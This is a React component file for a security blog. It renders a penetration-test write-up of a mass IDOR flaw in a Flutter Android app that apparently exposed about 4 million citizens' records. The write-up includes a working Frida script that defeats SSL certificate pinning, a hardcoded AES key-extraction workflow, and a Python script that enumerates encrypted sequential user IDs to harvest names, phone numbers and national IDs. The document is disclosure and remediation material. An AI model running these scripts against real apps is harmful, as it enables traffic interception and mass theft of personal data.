import { useParams, Link, Navigate } from 'react-router-dom'
import { motion } from 'framer-motion'
import {
  ArrowLeft, Clock, Calendar, Shield,
  AlertTriangle, CheckCircle, Info, DollarSign, Bug,
} from 'lucide-react'
import clsx from 'clsx'
import { getPost } from '../data/posts'
import CodeBlock from '../components/CodeBlock'
import DirectoryTree from '../components/DirectoryTree'

/* ─── Shared prose components ─────────────────────────── */
function Callout({ type = 'info', title, children }) {
  const cfg = {
    info:    { icon: Info,          border: 'border-cyber-blue/40',  bg: 'bg-cyber-blue/5',  text: 'text-cyber-blue',  label: title || 'Note' },
    warning: { icon: AlertTriangle, border: 'border-yellow-500/40',  bg: 'bg-yellow-500/5',  text: 'text-yellow-400',  label: title || 'Warning' },
    success: { icon: CheckCircle,   border: 'border-cyber-green/40', bg: 'bg-cyber-green/5', text: 'text-cyber-green', label: title || 'Success' },
    danger:  { icon: AlertTriangle, border: 'border-cyber-red/40',   bg: 'bg-cyber-red/5',   text: 'text-cyber-red',   label: title || 'Critical' },
  }[type]
  const Icon = cfg.icon
  return (
    <div className={clsx('my-6 rounded-xl border overflow-hidden', cfg.border)}>
      <div className={clsx('px-4 py-2 flex items-center gap-2 border-b font-mono text-xs font-semibold', cfg.bg, cfg.text, cfg.border)}>
        <Icon className="w-3.5 h-3.5" />{cfg.label}
      </div>
      <div className={clsx('px-4 py-3 text-sm leading-relaxed', cfg.bg, cfg.text)}>{children}</div>
    </div>
  )
}

function H2({ children }) {
  return (
    <h2 className="text-xl font-bold text-white mt-12 mb-4 flex items-center gap-2.5 font-mono border-b border-cyber-border/40 pb-3">
      <span className="text-cyber-green text-base">#</span>{children}
    </h2>
  )
}
function H3({ children }) {
  return (
    <h3 className="text-base font-semibold text-cyber-blue mt-7 mb-3 font-mono flex items-center gap-2">
      <span className="text-gray-600">##</span>{children}
    </h3>
  )
}
function P({ children }) {
  return <p className="text-gray-400 text-sm leading-relaxed mb-4">{children}</p>
}
function IC({ children }) {
  return (
    <code className="px-1.5 py-0.5 rounded bg-cyber-surface border border-cyber-border font-mono text-xs text-cyber-green">
      {children}
    </code>
  )
}
function HttpBox({ label, content, type = 'request' }) {
  return (
    <div className={clsx('my-5 rounded-xl overflow-hidden border', type === 'request' ? 'border-cyber-blue/30' : 'border-cyber-green/30')}>
      <div className={clsx('px-4 py-2 font-mono text-xs font-semibold border-b', type === 'request' ? 'bg-cyber-blue/10 text-cyber-blue border-cyber-blue/20' : 'bg-cyber-green/10 text-cyber-green border-cyber-green/20')}>
        {label}
      </div>
      <pre className="p-4 font-mono text-xs text-gray-300 leading-loose overflow-x-auto bg-cyber-surface whitespace-pre-wrap break-all">
        {content}
      </pre>
    </div>
  )
}

/* ─── IDOR Post ─────────────────────────────────────── */
const BLUTTER_TREE = [
  {
    name: 'blutter_output/',
    type: 'dir',
    children: [
      {
        name: 'asm/',
        type: 'dir',
        annotation: 'disassembled Dart snapshot functions',
        children: [
          { name: 'snapshot_hash.txt', type: 'file', annotation: 'unique hash of this snapshot' },
          {
            name: 'libapp/',
            type: 'dir',
            children: [
              { name: '_.asm', type: 'file', annotation: 'top-level / anonymous functions' },
              { name: 'AesHelper/', type: 'dir', children: [
                { name: 'encrypt.asm', type: 'file' },
                { name: 'decrypt.asm', type: 'file' },
              ]},
              { name: 'UserRepository/', type: 'dir', children: [
                { name: 'getUserById.asm', type: 'file' },
              ]},
            ],
          },
        ],
      },
      {
        name: 'ida_scripts/',
        type: 'dir',
        children: [
          { name: 'addNames.py', type: 'file', annotation: 'IDA Pro symbol renaming script' },
        ],
      },
      {
        name: 'jadx_script/',
        type: 'dir',
        children: [
          { name: 'addNames.js', type: 'file', annotation: 'JADX deobfuscation script' },
        ],
      },
      { name: 'pp.txt', type: 'file', annotation: '⭐ all objects, classes & memory addresses' },
    ],
  },
]

function IDORPost() {
  return (
    <div className="text-gray-400 text-sm leading-relaxed">

      {/* ── Overview ─────────────────────────────── */}
      <div className="glass-card p-6 mb-8 border-l-4 border-cyber-red">
        <h3 className="font-mono font-bold text-white text-base mb-3 flex items-center gap-2">
          <AlertTriangle className="w-4 h-4 text-cyber-red" /> Executive Summary
        </h3>
        <P>
          During a freelance mobile application penetration test engagement, I identified a <span className="text-cyber-red font-semibold">Critical-severity Mass IDOR (Insecure Direct Object Reference)</span> vulnerability in the Android application's backend API. By reverse-engineering the application's Flutter shared library, extracting a hardcoded AES-128-CBC encryption key and IV, and decrypting sequential user identifiers, I was able to enumerate and retrieve the personal data of <span className="text-cyber-red font-semibold">approximately 4 million citizens</span> — including names, phone numbers, national IDs, and addresses — using a single authenticated session.
        </P>
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4">
          {[
            { label: 'Severity',   value: 'Critical',              color: '#ff4455' },
            { label: 'Type',       value: 'Mass IDOR',             color: '#00ff88' },
            { label: 'Platform',   value: 'Android / Flutter',     color: '#00cfff' },
            { label: 'Records',    value: '~4 Million',            color: '#ff4455' },
          ].map(({ label, value, color }) => (
            <div key={label} className="bg-cyber-bg/60 rounded-lg p-3 border border-cyber-border/40">
              <p className="font-mono text-xs text-gray-600 mb-1">{label}</p>
              <p className="font-mono text-xs font-bold" style={{ color }}>{value}</p>
            </div>
          ))}
        </div>
      </div>

      {/* ── Step 1 ─────────────────────────────── */}
      <H2>Step 1 — Analyzing the APK</H2>
      <P>
        The engagement began with static analysis of the Android application package. My first goal was to identify the underlying framework and map the application's internal structure before attempting any dynamic analysis or network interception.
      </P>
      <P>
        I extracted the APK contents using <IC>apktool</IC>, a powerful framework for reverse engineering Android applications. This tool decodes the APK back to its near-original form, including resources, manifest files, and native libraries.
      </P>

      <CodeBlock language="bash" filename="01_extract_apk.sh" code={`# Decompile the APK to inspect its contents
apktool d target_app.apk -o extracted_app/

# Navigate into the extracted directory
ls extracted_app/

# Output:
# AndroidManifest.xml  assets/  lib/  original/  res/  smali/  unknown/`} />

      <P>
        Inside the <IC>lib/</IC> directory, I discovered a telling structure. The presence of <IC>libflutter.so</IC> and <IC>libapp.so</IC> immediately indicated this was a <span className="text-cyber-blue font-semibold">Flutter application</span> — Google's cross-platform framework that compiles Dart code into native ARM shared libraries.
      </P>

      <CodeBlock language="bash" filename="02_inspect_libs.sh" code={`# Inspect the lib directory
find extracted_app/lib/ -name "*.so" | sort

# Output:
# extracted_app/lib/arm64-v8a/libapp.so
# extracted_app/lib/arm64-v8a/libflutter.so

# Confirm architecture and binary type
file extracted_app/lib/arm64-v8a/libapp.so

# Output:
# libapp.so: ELF 64-bit LSB shared object, ARM aarch64,
# version 1 (SYSV), dynamically linked, stripped`} />

      <Callout type="info" title="Why libapp.so Matters">
        In Flutter applications, <IC>libapp.so</IC> contains the compiled Dart snapshot — the entire application logic compiled to native ARM64 machine code. Unlike traditional Android apps, there is no readable Java bytecode (smali). All business logic, API keys, encryption parameters, and network communication code lives inside this binary.
      </Callout>

      {/* ── Step 2 ─────────────────────────────── */}
      <H2>Step 2 — Bypassing SSL Certificate Pinning</H2>
      <P>
        Flutter applications compiled with BoringSSL implement SSL certificate verification at the native level, making traditional Java-based certificate pinning bypass techniques ineffective. The TLS handshake is handled entirely within <IC>libflutter.so</IC>, which means we need to hook at the native layer.
      </P>
      <P>
        I set up a dynamic analysis environment using a <span className="text-cyber-blue font-semibold">MEmu Android Emulator</span> (x86_64 with ARM translation support), deployed <IC>frida-server</IC> onto the device, and wrote a custom Frida script to hook BoringSSL's internal SSL verification function.
      </P>

      <CodeBlock language="bash" filename="03_setup_frida.sh" code={`# Push frida-server to the emulator via ADB
adb push frida-server-16.x.x-android-x86_64 /data/local/tmp/frida-server

# Set executable permissions
adb shell chmod +x /data/local/tmp/frida-server

# Start frida-server in the background (as root)
adb shell "su -c '/data/local/tmp/frida-server &'"

# Verify frida-server is running
adb shell ps | grep frida

# List running apps to find target package name
frida-ps -U | grep -i target`} />

      <P>
        With Frida running, I injected the following script to patch the SSL verification routine inside <IC>libflutter.so</IC>. The key function to neutralize is <IC>ssl_verify_peer_cert</IC> — BoringSSL's internal certificate chain validator:
      </P>

      <CodeBlock language="javascript" filename="flutter_ssl_bypass.js" code={`/**
 * Flutter SSL Pinning Bypass via BoringSSL Hook
 * Hooks ssl_verify_peer_cert inside libflutter.so to always
 * return ssl_verify_ok (0), disabling certificate validation.
 */

function hookSSLVerify(libName) {
  const lib = Process.findModuleByName(libName);
  if (!lib) {
    console.log(\`[-] \${libName} not found, skipping...\`);
    return;
  }
  console.log(\`[+] Found \${libName} @ \${lib.base}\`);

  /**
   * Pattern for ssl_verify_peer_cert prologue in BoringSSL ARM64:
   * int ssl_verify_peer_cert(SSL_HANDSHAKE *hs)
   * Returns: ssl_verify_ok (0) on success, ssl_verify_invalid (1) on failure
   */
  const PATTERN = "FF 43 01 D1 FD 7B 04 A9 FD 03 01 91 F3 0B 00 F9";

  Memory.scan(lib.base, lib.size, PATTERN, {
    onMatch(address) {
      console.log(\`[+] ssl_verify_peer_cert found @ \${address}\`);

      Interceptor.replace(address, new NativeCallback(
        function (ssl_handshake_ptr) {
          console.log("[*] ssl_verify_peer_cert intercepted — returning ssl_verify_ok");
          return 0; // ssl_verify_ok
        },
        "int",    // return type
        ["pointer"] // args: SSL_HANDSHAKE*
      ));
    },
    onComplete() {
      console.log("[*] Memory scan complete for " + libName);
    },
  });
}

// Flutter bundles BoringSSL in libflutter.so
// Some builds also include SSL code in libapp.so
setTimeout(function () {
  hookSSLVerify("libflutter.so");
  hookSSLVerify("libapp.so");
}, 1000);`} />

      <CodeBlock language="bash" filename="04_inject_frida.sh" code={`# Inject the bypass script into the running app
frida -U -f com.target.app -l flutter_ssl_bypass.js --no-pause

# Expected output:
# [+] Found libflutter.so @ 0x7f8a000000
# [+] ssl_verify_peer_cert found @ 0x7f8a3c2d10
# [*] ssl_verify_peer_cert intercepted — returning ssl_verify_ok`} />

      <P>
        After injecting the script, I configured Burp Suite as the system proxy and began capturing HTTPS traffic from the application. SSL pinning was successfully bypassed.
      </P>

      <Callout type="success" title="Pinning Bypassed">
        Burp Suite was now intercepting all HTTPS requests from the Flutter app. The TLS certificate chain was accepted regardless of the issuer, allowing full visibility into the application's API communication.
      </Callout>

      {/* ── Step 3 ─────────────────────────────── */}
      <H2>Step 3 — Enumerating the Unofficial API</H2>
      <P>
        With traffic interception active, I began navigating the application and cataloguing every API endpoint. Most endpoints were standard authenticated calls, but one stood out immediately — a <IC>POST /get-user</IC> endpoint that fetched detailed user profile information.
      </P>
      <P>
        The request body contained a single parameter: <IC>user_id</IC>. However, the value was not a plaintext identifier — it appeared to be a Base64-encoded ciphertext. The application was encrypting the user ID before sending it to the server.
      </P>

      <HttpBox
        label="Intercepted Request — POST /get-user"
        type="request"
        content={`POST /api/v1/get-user HTTP/2
Host: api.target-app.com
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
User-Agent: Dart/3.0 (dart:io)
Content-Length: 44

user_id=RkQ5M2FhQjhYekxvUDNtY1ZodVUwQT09`}
      />

      <HttpBox
        label="Server Response — 200 OK"
        type="response"
        content={`HTTP/2 200 OK
Content-Type: application/json

{
  "status": "success",
  "data": {
    "user_id":    1,
    "full_name":  "Yousef Zain Aldeen",
    "national_id":"1234567890",
    "phone":      "+966-5X-XXX-XXXX",
    "address":    "Yanbu, Saudi Arabia",
    "dob":        "1999-01-01",
    "email":      "yousef@example.com"
  }
}`}
      />

      <Callout type="warning" title="Encryption ≠ Authorization">
        The server accepted <em>any</em> validly encrypted user ID — regardless of whether the requesting user had authorization to view that account. There was no server-side ownership or permission check. Encryption was used purely as obfuscation, not as a security control.
      </Callout>

      <P>
        The immediate hypothesis was that the user IDs were sequential integers — if I could decrypt my own <IC>user_id</IC>, determine the format, and re-encrypt an arbitrary integer, I could fetch any account. The challenge: finding the encryption key and IV embedded inside <IC>libapp.so</IC>.
      </P>

      {/* ── Step 4 ─────────────────────────────── */}
      <H2>Step 4 — Reverse Engineering with Blutter</H2>
      <H3>What Is Blutter?</H3>
      <P>
        <span className="text-cyber-blue font-semibold">Blutter</span> is an open-source static analysis tool specifically designed for Flutter applications. Because Flutter compiles Dart code into native ARM64 snapshots (inside <IC>libapp.so</IC>), traditional decompilers like JADX cannot parse it. Blutter solves this by understanding the Dart snapshot format: it reconstructs class names, method names, object references, and memory addresses from the binary — producing human-readable output that makes reverse engineering tractable.
      </P>
      <P>
        It is particularly powerful for finding hardcoded strings, encryption keys, API endpoints, and business logic that would otherwise require deep manual ARM64 disassembly.
      </P>

      <CodeBlock language="bash" filename="05_blutter_setup.sh" code={`# Clone Blutter from GitHub
git clone https://github.com/worawit/blutter.git
cd blutter

# Install Python dependencies
pip3 install -r requirements.txt

# Build Blutter (requires cmake, ninja, and libzip)
# On Linux/macOS:
python3 setup.py

# On Windows (with Visual Studio Build Tools):
python3 setup.py --vs`} />

      <CodeBlock language="bash" filename="06_run_blutter.sh" code={`# Run Blutter against the extracted arm64 library
# Syntax: blutter.py <path_to_libapp.so> <arch> <output_dir>

python3 blutter.py \\
  /path/to/extracted_app/lib/arm64-v8a/libapp.so \\
  arm64 \\
  blutter_output/

# Blutter will analyze the snapshot and generate:
# - Assembly files (.asm) for every Dart class/method
# - IDA Pro and JADX helper scripts
# - pp.txt — a full object/class dump with memory addresses`} />

      <P>The output directory structure generated by Blutter:</P>

      <DirectoryTree title="blutter_output/ — Generated File Tree" tree={BLUTTER_TREE} />

      <H3>Mining pp.txt for the Encryption Key</H3>
      <P>
        The most valuable output from Blutter is <IC>pp.txt</IC>. It lists every Dart object created in the application — including string constants — alongside their memory addresses. I searched this file for AES-related strings:
      </P>

      <CodeBlock language="bash" filename="07_find_aes_key.sh" code={`# Search pp.txt for AES-related strings
grep -i "aes" blutter_output/pp.txt

# Sample output (redacted):
# 0x00ab1234  String: "AES/CBC/PKCS7"
# 0x00ab1248  String: "Hx7Kp2Qm9Nw3Rz6Y"        <-- KEY (16 bytes)
# 0x00ab125c  String: "Jv4Ls8Ft1Ue5Xb0D"        <-- IV  (16 bytes)
# 0x00ab1270  String: "AesEncryptionHelper"

# Also search for the class that uses these values
grep -i "encrypt" blutter_output/pp.txt | head -20`} />

      <P>
        Three consecutive string entries appeared near references to an <IC>AesEncryptionHelper</IC> class:
      </P>

      <div className="my-5 glass-card overflow-hidden">
        <div className="px-4 py-2.5 bg-cyber-bg/60 border-b border-cyber-border font-mono text-xs text-gray-400">
          pp.txt — relevant excerpt
        </div>
        <div className="p-4 font-mono text-xs leading-loose">
          <div><span className="text-gray-600">0x00ab1234  </span><span className="text-cyber-purple">String</span><span className="text-gray-500">: </span><span className="text-cyber-green">"AES/CBC/PKCS7"</span>            <span className="text-gray-600">// cipher suite</span></div>
          <div><span className="text-gray-600">0x00ab1248  </span><span className="text-cyber-purple">String</span><span className="text-gray-500">: </span><span className="text-cyber-red">"Hx7Kp2Qm9Nw3Rz6Y"</span>        <span className="text-gray-600">// AES-128 key (16 bytes) ⭐</span></div>
          <div><span className="text-gray-600">0x00ab125c  </span><span className="text-cyber-purple">String</span><span className="text-gray-500">: </span><span className="text-cyber-red">"Jv4Ls8Ft1Ue5Xb0D"</span>        <span className="text-gray-600">// IV (16 bytes) ⭐</span></div>
          <div><span className="text-gray-600">0x00ab1270  </span><span className="text-cyber-purple">Type</span><span className="text-gray-500">:   </span><span className="text-cyber-blue">AesEncryptionHelper</span>        <span className="text-gray-600">// class reference</span></div>
        </div>
      </div>

      <Callout type="danger" title="Hardcoded Credentials">
        The AES-128-CBC secret key and initialization vector were hardcoded directly inside the compiled Dart snapshot. Any attacker with access to the APK could extract these within minutes using Blutter — completely undermining the encryption's purpose.
      </Callout>

      {/* ── Step 5 ─────────────────────────────── */}
      <H2>Step 5 — Decrypting &amp; Re-Encrypting User IDs</H2>
      <P>
        With the key and IV extracted, I wrote a Python script to decrypt the intercepted <IC>user_id</IC> ciphertext and re-encrypt arbitrary integer values. I used the <IC>pycryptodome</IC> library, which supports AES-128-CBC with PKCS#7 padding — matching the cipher suite found in <IC>pp.txt</IC>.
      </P>

      <CodeBlock language="python" filename="aes_helper.py" code={`#!/usr/bin/env python3
"""
AES-128-CBC Encrypt / Decrypt helper
Mirrors the AesEncryptionHelper class extracted from libapp.so
"""

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# Extracted from pp.txt via Blutter — REDACTED in public disclosure
AES_KEY = b"Hx7Kp2Qm9Nw3Rz6Y"   # 16 bytes → AES-128
AES_IV  = b"Jv4Ls8Ft1Ue5Xb0D"   # 16 bytes


def encrypt_user_id(user_id: int) -> str:
    """
    Encrypt an integer user ID to produce the Base64 ciphertext
    expected by the /get-user endpoint.
    """
    plaintext = str(user_id).encode("utf-8")
    cipher    = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    ct_bytes  = cipher.encrypt(pad(plaintext, AES.block_size))
    return base64.b64encode(ct_bytes).decode("utf-8")


def decrypt_user_id(b64_ciphertext: str) -> str:
    """
    Decrypt the Base64-encoded ciphertext returned by the app.
    """
    ct_bytes  = base64.b64decode(b64_ciphertext)
    cipher    = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    plaintext = unpad(cipher.decrypt(ct_bytes), AES.block_size)
    return plaintext.decode("utf-8")


# ── Quick validation ────────────────────────────────────
if __name__ == "__main__":
    # Decrypt our own intercepted ciphertext to verify the key
    captured = "RkQ5M2FhQjhYekxvUDNtY1ZodVUwQT09"
    uid_plain = decrypt_user_id(captured)
    print(f"[+] Decrypted user_id: {uid_plain}")   # → 1

    # Re-encrypt a different ID
    for test_id in [1, 2, 1000, 4000000]:
        enc = encrypt_user_id(test_id)
        dec = decrypt_user_id(enc)
        assert dec == str(test_id), "Round-trip mismatch!"
        print(f"    ID {test_id:>8} → {enc}")`} />

      <CodeBlock language="bash" filename="run_aes_helper.sh" code={`python3 aes_helper.py

# Output:
# [+] Decrypted user_id: 1
#     ID        1 → RkQ5M2FhQjhYekxvUDNtY1ZodVUwQT09
#     ID        2 → aGVsbG8yd29ybGQ5M2FhQjhYekx...
#     ID     1000 → ZnVuY3Rpb25MaXN0ZW5lckhvc3Q...
#     ID  4000000 → c2VjcmV0S2V5SXZQYXJhbWV0ZXI...`} />

      <Callout type="danger" title="Sequential IDs Confirmed">
        Decrypting my own session's <IC>user_id</IC> returned <IC>1</IC>. After creating a second test account and decrypting its ID, the result was <IC>2</IC>. The IDs were sequential integers starting from 1 and reaching at least <IC>4,000,000</IC> — the total number of registered users reported in the app's public marketing materials.
      </Callout>

      {/* ── Step 6 ─────────────────────────────── */}
      <H2>Step 6 — Mass IDOR Exploitation</H2>
      <P>
        With sequential IDs and a working encrypt/decrypt pipeline, I developed a proof-of-concept exploitation script to demonstrate the full impact. I limited the demonstration to <span className="text-cyber-red font-semibold">50 accounts</span> to avoid causing harm and immediately reported after confirming the vulnerability.
      </P>

      <CodeBlock language="python" filename="mass_idor_poc.py" code={`#!/usr/bin/env python3
"""
Mass IDOR Proof-of-Concept — Educational Demonstration Only
Target: POST /api/v1/get-user
Vulnerability: No authorization check on user_id parameter

IMPORTANT: This script was used ONLY for controlled PoC demonstration
against 50 accounts with client authorization. Unauthorized use is illegal.
"""

import requests
import json
import time
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# ── Configuration ───────────────────────────────────────
API_BASE   = "https://api.example.com"
ENDPOINT   = f"{API_BASE}/api/v1/get-user"
AUTH_TOKEN = "<YOUR_JWT_TOKEN>"          # Valid session token
AES_KEY    = b"Hx7Kp2Qm9Nw3Rz6Y"       # Extracted from libapp.so
AES_IV     = b"Jv4Ls8Ft1Ue5Xb0D"       # Extracted from libapp.so
MAX_ID     = 50                          # PoC: limit to 50 for demo
DELAY_SEC  = 0.3                         # Rate limiting — be responsible

HEADERS = {
    "Authorization":  f"Bearer {AUTH_TOKEN}",
    "Content-Type":   "application/x-www-form-urlencoded",
    "User-Agent":     "Dart/3.0 (dart:io)",
    "Accept":         "application/json",
}


# ── Crypto helpers ──────────────────────────────────────
def encrypt_id(user_id: int) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    ct     = cipher.encrypt(pad(str(user_id).encode(), AES.block_size))
    return base64.b64encode(ct).decode()


# ── Exploitation loop ───────────────────────────────────
def run_poc():
    leaked   = []
    errors   = 0

    print(f"[*] Starting Mass IDOR PoC — targeting IDs 1 to {MAX_ID}")
    print(f"[*] Endpoint: {ENDPOINT}\\n{'─'*60}")

    for uid in range(1, MAX_ID + 1):
        encrypted_id = encrypt_id(uid)
        try:
            resp = requests.post(
                ENDPOINT,
                headers=HEADERS,
                data={"user_id": encrypted_id},
                timeout=10,
                verify=False,           # Frida already handles TLS
            )

            if resp.status_code == 200:
                data = resp.json().get("data", {})
                leaked.append(data)
                print(
                    f"  [+] ID {uid:>7} | "
                    f"{data.get('full_name','?'):<25} | "
                    f"{data.get('phone','?'):<18} | "
                    f"{data.get('national_id','?')}"
                )
            elif resp.status_code == 404:
                print(f"  [-] ID {uid:>7} | Not found")
            else:
                print(f"  [!] ID {uid:>7} | HTTP {resp.status_code}")
                errors += 1

        except requests.RequestException as e:
            print(f"  [E] ID {uid:>7} | {e}")
            errors += 1

        time.sleep(DELAY_SEC)

    # ── Save results ────────────────────────────────────
    output_file = "idor_poc_results.json"
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(leaked, f, indent=2, ensure_ascii=False)

    print(f"\\n{'─'*60}")
    print(f"[!] PoC complete — {len(leaked)} records extracted, {errors} errors")
    print(f"[!] Results saved to {output_file}")
    print(f"[!] Extrapolated full exposure: ~4,000,000 citizens")
    return leaked


if __name__ == "__main__":
    run_poc()`} />

      <H3>PoC Output (Redacted)</H3>
      <CodeBlock language="bash" filename="poc_output.txt" code={`[*] Starting Mass IDOR PoC — targeting IDs 1 to 50
[*] Endpoint: https://api.example.com/api/v1/get-user
────────────────────────────────────────────────────────────
  [+] ID       1 | Yousef Zain Aldeen        | +966-5X-XXX-0001 | 10XXXXXXXX01
  [+] ID       2 | [REDACTED]                | +966-5X-XXX-0002 | 10XXXXXXXX02
  [+] ID       3 | [REDACTED]                | +966-5X-XXX-0003 | 10XXXXXXXX03
  ...
  [+] ID      50 | [REDACTED]                | +966-5X-XXX-0050 | 10XXXXXXXX50
────────────────────────────────────────────────────────────
[!] PoC complete — 50 records extracted, 0 errors
[!] Results saved to idor_poc_results.json
[!] Extrapolated full exposure: ~4,000,000 citizens`} />

      <Callout type="success" title="Vulnerability Confirmed — Reported Immediately">
        After confirming the vulnerability with 50 accounts, I immediately halted the test and prepared a detailed report for the client including this full technical writeup, CVSS score, and remediation guidance. No data was retained beyond what was necessary to demonstrate the vulnerability.
      </Callout>

      {/* ── Impact ─────────────────────────────── */}
      <H2>Impact Assessment</H2>
      <div className="glass-card overflow-hidden my-5">
        <div className="px-5 py-3 bg-cyber-red/10 border-b border-cyber-red/20 font-mono text-xs text-cyber-red font-semibold">
          CVSS v3.1 Score: 9.8 CRITICAL
        </div>
        <div className="p-5 space-y-3">
          {[
            { label: 'Attack Vector',       value: 'Network',      color: '#ff4455' },
            { label: 'Attack Complexity',   value: 'Low',          color: '#ff4455' },
            { label: 'Privileges Required', value: 'Low',          color: '#facc15' },
            { label: 'User Interaction',    value: 'None',         color: '#ff4455' },
            { label: 'Scope',               value: 'Unchanged',    color: '#9ca3af' },
            { label: 'Confidentiality',     value: 'High',         color: '#ff4455' },
            { label: 'Integrity',           value: 'None',         color: '#9ca3af' },
            { label: 'Availability',        value: 'None',         color: '#9ca3af' },
          ].map(({ label, value, color }) => (
            <div key={label} className="flex items-center justify-between py-1.5 border-b border-cyber-border/20 last:border-0">
              <span className="font-mono text-xs text-gray-500">{label}</span>
              <span className="font-mono text-xs font-bold" style={{ color }}>{value}</span>
            </div>
          ))}
        </div>
      </div>

      <P>The confirmed impact of this vulnerability, if exploited maliciously:</P>
      <ul className="space-y-2 mb-6 ml-2">
        {[
          'Exfiltration of PII for ~4 million citizens (names, national IDs, phone numbers, addresses, dates of birth)',
          'Identity theft and social engineering attacks against affected users',
          'Regulatory and legal liability under national data protection legislation',
          'Reputational damage to the client organization and loss of user trust',
          'Potential for targeted phishing, SIM-swap fraud, and financial fraud at scale',
        ].map((item, i) => (
          <li key={i} className="flex items-start gap-2 text-sm text-gray-400">
            <span className="text-cyber-red mt-1 flex-shrink-0">→</span>
            <span>{item}</span>
          </li>
        ))}
      </ul>

      {/* ── Recommendations ─────────────────────── */}
      <H2>Recommendations &amp; Remediation</H2>
      <div className="space-y-3 mb-6">
        {[
          {
            num: '01',
            title: 'Enforce Server-Side Authorization',
            desc: 'Every request to /get-user must verify that the authenticated user\'s session token matches the requested user_id. The server must never trust a client-supplied identifier alone.',
            priority: 'P0 — Immediate',
            color: '#ff4455',
          },
          {
            num: '02',
            title: 'Replace Symmetric Encryption with Opaque Tokens',
            desc: 'Replace sequential integer IDs with UUIDs (v4) or HMAC-signed tokens. Symmetric encryption with a hardcoded key is not an authorization mechanism.',
            priority: 'P0 — Immediate',
            color: '#ff4455',
          },
          {
            num: '03',
            title: 'Remove Hardcoded Cryptographic Material',
            desc: 'Encryption keys and IVs must never be compiled into the application binary. Use server-side key derivation, certificate-bound tokens, or a secure key management service.',
            priority: 'P1 — Short Term',
            color: '#facc15',
          },
          {
            num: '04',
            title: 'Implement Rate Limiting & Anomaly Detection',
            desc: 'Apply rate limiting on sensitive endpoints. Flag and alert on unusual enumeration patterns (e.g., sequential parameter values, high-frequency single-user requests).',
            priority: 'P1 — Short Term',
            color: '#facc15',
          },
          {
            num: '05',
            title: 'Upgrade to IMDSv2-Equivalent API Token Binding',
            desc: 'Bind API responses to the authenticated session rather than a standalone encrypted parameter. Implement short-lived, per-request tokens for sensitive data access.',
            priority: 'P2 — Medium Term',
            color: '#00cfff',
          },
        ].map(({ num, title, desc, priority, color }) => (
          <div key={num} className="glass-card p-4 flex gap-4">
            <div className="font-mono text-2xl font-bold opacity-20 flex-shrink-0 w-8">{num}</div>
            <div className="flex-1">
              <div className="flex items-start justify-between gap-3 mb-1.5">
                <h4 className="font-mono font-semibold text-white text-sm">{title}</h4>
                <span className="font-mono text-xs px-2 py-0.5 rounded-full border flex-shrink-0" style={{ color, borderColor: color + '50', backgroundColor: color + '10' }}>{priority}</span>
              </div>
              <p className="text-xs text-gray-500 leading-relaxed">{desc}</p>
            </div>
          </div>
        ))}
      </div>

      {/* ── Timeline ─────────────────────────────── */}
      <H2>Disclosure Timeline</H2>
      <div className="glass-card overflow-hidden my-5">
        {[
          { date: 'Day 1',  event: 'APK extraction and framework identification (Flutter confirmed)', color: 'text-gray-400' },
          { date: 'Day 2',  event: 'SSL pinning bypassed via Frida — traffic interception active',   color: 'text-cyber-blue' },
          { date: 'Day 2',  event: 'Suspicious encrypted user_id parameter identified',              color: 'text-cyber-blue' },
          { date: 'Day 3',  event: 'libapp.so reverse-engineered with Blutter — AES key/IV found',  color: 'text-cyber-green' },
          { date: 'Day 3',  event: 'Sequential IDs confirmed — Mass IDOR vulnerability established', color: 'text-cyber-red' },
          { date: 'Day 3',  event: 'PoC halted at 50 records — full report drafted and delivered',  color: 'text-cyber-green' },
          { date: 'Day 7',  event: 'Client confirmed receipt and initiated emergency patch',         color: 'text-yellow-400' },
          { date: 'Day 14', event: 'Authorization checks deployed to production',                    color: 'text-cyber-green' },
          { date: 'Day 21', event: 'Hardcoded key removed; server-side token system implemented',    color: 'text-cyber-green' },
        ].map(({ date, event, color }, i) => (
          <div key={i} className="flex items-start gap-4 px-5 py-3 border-b border-cyber-border/20 last:border-0 hover:bg-cyber-bg/30 transition-colors">
            <span className="font-mono text-xs text-gray-600 w-12 flex-shrink-0">{date}</span>
            <span className={`font-mono text-xs ${color}`}>{event}</span>
          </div>
        ))}
      </div>

      {/* ── Conclusion ───────────────────────────── */}
      <H2>Conclusion</H2>
      <P>
        This engagement is a textbook example of how multiple security weaknesses compound into a catastrophic vulnerability. In isolation, each finding seems moderate: an API that accepts user-supplied identifiers, an AES-encrypted parameter, a compiled mobile application. But when chained together — a hardcoded encryption key extractable via static analysis, sequential predictable IDs, and a complete absence of server-side authorization — the result is a single-authenticated-request attack that could expose the entire user database.
      </P>
      <P>
        Encryption is not authorization. The application's designers likely believed that encrypting the <IC>user_id</IC> would prevent tampering, but without verifying <em>who</em> is asking for <em>which</em> record on the server side, the encryption provides zero access control benefit — especially when the key lives inside the very binary an attacker already possesses.
      </P>
      <P>
        This underscores a foundational principle of secure API design: <span className="text-cyber-green font-semibold">never trust any client-supplied identifier without server-side ownership verification</span>. Every sensitive data request must be validated against the authenticated session, regardless of how the identifier is formatted or encoded.
      </P>

      <Callout type="info" title="Tools Used in This Assessment">
        <span className="flex flex-wrap gap-2 mt-1">
          {['Apktool', 'Frida', 'Blutter', 'Burp Suite', 'MEmu Emulator', 'ADB', 'Python 3', 'pycryptodome'].map(t => (
            <IC key={t}>{t}</IC>
          ))}
        </span>
      </Callout>

    </div>
  )
}

/* ─── Severity badge styles ─────────────────────────── */
const SEVERITY_STYLES = {
  Critical: 'bg-cyber-red/10 text-cyber-red border-cyber-red/30',
  High:     'bg-orange-500/10 text-orange-400 border-orange-500/30',
  Medium:   'bg-yellow-500/10 text-yellow-400 border-yellow-500/30',
}

/* ─── Post router ───────────────────────────────────── */
function PostContent({ slug }) {
  if (slug === 'mass-idor-citizen-data-leak') return <IDORPost />
  return (
    <div className="text-center py-16 text-gray-600 font-mono text-sm">
      <Shield className="w-10 h-10 mx-auto mb-3 opacity-30" />
      <p>Full writeup coming soon...</p>
    </div>
  )
}

/* ─── Main page ─────────────────────────────────────── */
export default function BlogPost() {
  const { slug } = useParams()
